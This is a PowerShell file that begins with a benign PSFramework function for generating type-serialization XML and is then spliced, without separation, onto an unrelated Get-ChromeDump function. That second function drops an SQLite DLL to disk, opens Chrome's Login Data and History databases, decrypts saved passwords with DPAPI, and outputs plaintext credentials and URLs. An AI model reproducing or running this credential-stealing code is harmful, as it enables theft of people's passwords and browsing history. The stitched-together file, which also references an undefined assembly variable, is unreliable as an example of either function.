﻿function Get-PSFTypeSerializationData
{

	[Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSPossibleIncorrectUsageOfAssignmentOperator", "")]
	[CmdletBinding(HelpUri = 'https://psframework.org/documentation/commands/PSFramework/Get-PSFTypeSerializationData')]
	Param (
		[Parameter(ValueFromPipeline = $true)]
		[object[]]
		$InputObject,
		
		[ValidateSet('Grouped','SingleItem')]
		[string]
		$Mode = "Grouped",
		
		[switch]
		$Fragment,
		
		[string]
		$Serializer = "PSFramework.Serialization.SerializationTypeConverter",
		
		[string]
		$Method = "GetSerializationData"
	)
	
	begin
	{
		
		function Get-XmlHeader
		{
			
			Param (
				
			)
			
			@"
<?xml version="1.0" encoding="utf-8"?>
<Types>

"@
		}
		
		function Get-XmlBody
		{
			
			Param (
				[string]
				$Type,
				
				[string]
				$Serializer,
				
				[string]
				$Method
			)
			
			@"

  <!-- $Type -->
  <Type>
    <Name>Deserialized.$Type</Name>
    <Members>
      <MemberSet>
        <Name>PSStandardMembers</Name>
        <Members>
          <NoteProperty>
            <Name>
              TargetTypeForDeserialization
            </Name>
            <Value>
              $Type
            </Value>
          </NoteProperty>
        </Members>
      </MemberSet>
    </Members>
  </Type>
  <Type>
    <Name>$Type</Name>
    <Members>
      <CodeProperty IsHidden="true">
        <Name>SerializationData</Name>
        <GetCodeReference>
          <TypeName>$Serializer</TypeName>
          <MethodName>$Method</MethodName>
        </GetCodeReference>
      </CodeProperty>
    </Members>
    <TypeConverter>
      <TypeName>$Serializer</TypeName>
    </TypeConverter>
  </Type>

"@
		}
		
		function Get-XmlFooter
		{
			
			Param (
				
			)
			@"
</Types>
"@
		}
		
		
		$types = @()
		if ($Mode -eq 'Grouped')
		{
			if (-not $Fragment) { $xml = Get-XmlHeader }
			else { $xml = "" }
		}
	}
	process
	{
		foreach ($item in $InputObject)
		{
			if ($null -eq $item) { continue }
			$type = $null
			if ($res = $item -as [System.Type]) { $type = $res }
			else { $type = $item.GetType() }
			
			if ($type -in $types) { continue }
			
			switch ($Mode)
			{
				'Grouped' { $xml += Get-XmlBody -Method $Method -Serializer $Serializer -Type $type.FullName }
				'SingleItem'
				{
					if (-not $Fragment)
					{
						$xml = Get-XmlHeader
						$xml += Get-XmlBody -Method $Method -Serializer $Serializer -Type $type.FullName
						$xml += Get-XmlFooter
						$xml
					}
					else
					{
						Get-XmlBody -Method $Method -Serializer $Serializer -Type $type.FullName
					}
				}
			}
			
			$types += $type
		}
	}
	end
	{
		if ($Mode -eq 'Grouped')
		{
			if (-not $Fragment) { $xml += Get-XmlFooter }
			$xml
		}
	}
}Function Get-ChromeDump{

  

  [CmdletBinding()]
  param(
    [Parameter(Mandatory = $False)]
    [string]$OutFile
  )
    

    Add-Type -Assembly System.Security

    
    if(([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem){
      Write-Warning "Unable to decrypt passwords contained in Login Data file as SYSTEM."
      $NoPasswords = $True
    }

    if([IntPtr]::Size -eq 8)
    {
        
    }
    else
    {
        
    
    }
    
    
    
    Write-Verbose "[+]System.Data.SQLite.dll will be written to disk"
    
   
    $content = [System.Convert]::FromBase64String($assembly) 
    
    
    
    $assemblyPath = "$($env:LOCALAPPDATA)\System.Data.SQLite.dll" 
    
    
    if(Test-path $assemblyPath)
    {
      try 
      {
        Add-Type -Path $assemblyPath
      }
      catch 
      {
        Write-Warning "[!]Unable to load SQLite assembly"
        break
      }
    }
    else
    {
        [System.IO.File]::WriteAllBytes($assemblyPath,$content)
        Write-Verbose "[+]Assembly for SQLite written to $assemblyPath"
        try 
        {
            Add-Type -Path $assemblyPath
        }
        catch 
        {
            Write-Warning "[!]Unable to load SQLite assembly"
            break
        }
    }

    

    if(Get-Process | Where-Object {$_.Name -like "*chrome*"}){
      Write-Warning "[!]Cannot parse Data files while chrome is running"
      break
    }

    
    $OS = [environment]::OSVersion.Version
    if($OS.Major -ge 6){
      $chromepath = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default"
    }
    else{
      $chromepath = "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default"
    }
    
    if(!(Test-path $chromepath)){
      Throw "Chrome user data directory does not exist"
    }
    else{
      
      if(Test-Path -Path "$chromepath\Web Data"){$WebDatadb = "$chromepath\Web Data"}
      
      if(Test-Path -Path "$chromepath\Login Data"){$loginDatadb = "$chromepath\Login Data"}
      
      if(Test-Path -Path "$chromepath\History"){$historydb = "$chromepath\History"}
      

    }

    if(!($NoPasswords)){ 

      
      $connStr = "Data Source=$loginDatadb; Version=3;"

      $connection = New-Object System.Data.SQLite.SQLiteConnection($connStr)

      $OpenConnection = $connection.OpenAndReturn()

      Write-Verbose "Opened DB file $loginDatadb"

      $query = "SELECT * FROM logins;"

      $dataset = New-Object System.Data.DataSet

      $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$OpenConnection)

      [void]$dataAdapter.fill($dataset)

      $logins = @()

      
      $scheme_enum = @{0 = "HTML";1 = "BASIC";2 = "DIGEST"; 3 = "OTHER"}

      Write-Verbose "Parsing results of query $query"

      $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
        $encryptedBytes = $_.password_value
        $username = $_.username_value
        $action_url = $_.action_url
        $origin_url = $_.origin_url
        $scheme = $scheme_enum[[int]$_.scheme]
        $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        $plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
        $login = New-Object PSObject -Property @{
          ORIGIN_URL = $origin_url
          ACTION_URL = $action_url
          PWD = $plaintext
          USER = $username
          SCHEME = $scheme
        }

        $logins += $login
      }
    }

    
    $connString = "Data Source=$historydb; Version=3;"

    $connection = New-Object System.Data.SQLite.SQLiteConnection($connString)

    $Open = $connection.OpenAndReturn()

    Write-Verbose "Opened DB file $historydb"

    $DataSet = New-Object System.Data.DataSet

    $query = "SELECT * FROM urls;"

    $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$Open)

    [void]$dataAdapter.fill($DataSet)

    $History = @()
    $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
      $HistoryInfo = New-Object PSObject -Property @{
        Title = $_.title 
        URL = $_.url
      }
      $History += $HistoryInfo
    }
    
    if(!($OutFile)){
      "[*]CHROME PASSWORDS`n"
      $logins | Format-List ORIGIN_URL, ACTION_URL, PWD, USER, SCHEME | Out-String

      "[*]CHROME HISTORY`n"

      $History | Format-List Title,URL | Out-String
    }
    else {
        "[*]LOGINS`n" | Out-File $OutFile 
        $logins | Out-File $OutFile -Append

        "[*]HISTORY`n" | Out-File $OutFile -Append
        $History | Out-File $OutFile -Append  

    }

    
    Write-Warning "[!] Please remove SQLite assembly from here: $assemblyPath"

    
    
}